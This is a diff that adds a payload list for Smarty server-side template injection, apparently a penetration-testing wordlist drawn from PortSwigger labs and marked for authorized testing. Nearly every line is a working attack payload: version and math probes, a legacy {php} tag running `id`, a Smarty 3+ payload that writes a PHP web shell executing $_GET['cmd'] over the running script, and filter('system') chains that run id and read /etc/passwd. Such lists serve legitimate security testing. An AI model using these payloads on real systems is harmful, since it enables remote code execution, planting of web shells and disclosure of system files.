@@ -1,0 +1,24 @@
+# Smarty SSTI — detection + RCE seeds
+# Source: PortSwigger SSTI labs, PAT ssti-fuzz (Smarty lines), skills/portswigger-injection2.md
+# Tier: Curated | Authorized testing only
+
+# --- Detection / version leak ---
+{$smarty.version}
+{smarty.version}
+
+# --- Math probe ---
+{7*7}
+
+# --- Legacy RCE (Smarty < 3.1, php tag enabled) ---
+{php}echo `id`;{/php}
+
+# --- Smarty 3+ (php tag disabled) — write webshell via internal API ---
+{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
+
+# --- filter('system') chains (Twig-like, sometimes works on misconfigured Smarty) ---
+{['id']|filter('system')}
+{['cat\x20/etc/passwd']|filter('system')}
+
+# --- config / self introspection ---
+{$smarty.template}
+{$smarty.current_dir}
